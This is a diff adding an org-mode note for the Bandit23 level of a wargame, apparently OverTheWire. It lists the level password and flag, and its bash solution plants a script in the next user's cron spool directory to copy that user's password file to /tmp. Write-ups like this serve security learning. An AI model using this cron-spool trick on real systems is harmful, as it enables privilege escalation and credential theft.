@@ -1,0 +1,29 @@
+:PROPERTIES:
+:ID:       f600117f-3a57-4d68-b6a1-eed2e3e6afc5
+:END:
+#+title: Bandit23
+* Previous
+[[id:ae959b43-1fe4-4d4f-88ff-23fe69df2304][Bandit22]]
+
+* Password
+jc1udXuA1tiHqjIsL8yaapX5XIAI6i0n
+
+* Flag
+UoMYTrfrBFHyQXmg6gzctqAwOmw1IohZ
+
+* Notes
+
+Create a script in /tmp/randomdirname.
+#+begin_src bash
+#!/bin/bash
+cat /etc/bandit_pass/bandit24 > /tmp/randomdirname/pw
+#+end_src
+Give it perm so bandit24 can run it.
+Copy it to script dir.
+wait... profit.
+#+begin_src bash
+cp ./script.sh /var/spool/bandit24
+#+end_src
+
+* Next
+[[id:2651ec98-61c8-4954-9394-2714e5ba1b69][Bandit24]]
